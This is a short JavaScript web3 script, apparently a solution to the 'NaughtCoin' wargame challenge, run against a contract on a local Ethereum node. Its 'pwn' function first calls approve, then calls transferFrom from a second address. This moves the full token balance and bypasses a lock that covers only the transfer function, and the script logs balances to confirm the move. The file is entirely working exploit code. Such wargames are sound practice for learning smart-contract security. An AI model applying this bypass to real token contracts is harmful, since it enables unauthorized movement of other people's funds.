// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const naughtCoin = require('./build/contracts/NaughtCoin.json');

(async function pwn() {
  var publicKey1 = '0x70c0d1904aa32a40d146c9c45a7cb883ea7fe84c';
  var publicKey2 = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();

  const naughtCoinAddress = naughtCoin.networks[networkId].address;
  const naughtCoinContract = new web3.eth.Contract(
    naughtCoin.abi,
    naughtCoinAddress,
  );

  let balance = await naughtCoinContract.methods
    .balanceOf(publicKey1)
    .call({from: publicKey1});
  console.log('Balance publicKey1:', balance);

  console.log('Pwning contract by calling approve and transferFrom');
  await naughtCoinContract.methods
    .approve(publicKey2, '1000000000000000000000000')
    .send({from: publicKey1});

  await naughtCoinContract.methods
    // 1000000 * 10 ^18
    .transferFrom(publicKey1, publicKey2, '1000000000000000000000000')
    .send({from: publicKey2});

  balance = await naughtCoinContract.methods
    .balanceOf(publicKey1)
    .call({from: publicKey1});
  console.log('Balance publicKey1:', balance);
  balancePublicKey2 = await naughtCoinContract.methods
    .balanceOf(publicKey2)
    .call({from: publicKey2});
  console.log('Balance publicKey2:', balancePublicKey2);
})();
